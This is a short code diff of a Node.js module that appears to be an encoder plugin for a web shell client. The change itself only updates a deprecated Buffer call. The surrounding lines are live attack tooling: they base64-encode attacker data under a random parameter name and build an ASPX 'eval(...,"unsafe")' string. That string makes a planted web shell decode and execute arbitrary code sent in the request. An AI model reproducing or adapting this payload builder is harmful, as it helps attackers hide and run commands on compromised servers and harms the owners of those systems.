@@ -8,7 +8,7 @@
 
 module.exports = (pwd, data) => {
   let randomID = `_0x${Math.random().toString(16).substr(2)}`;
-  data[randomID] = new Buffer(data['_']).toString('base64');
+  data[randomID] = Buffer.from(data['_']).toString('base64');
   data[pwd] = `eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["${randomID}"])),"unsafe");`;
   delete data['_'];
   return data;
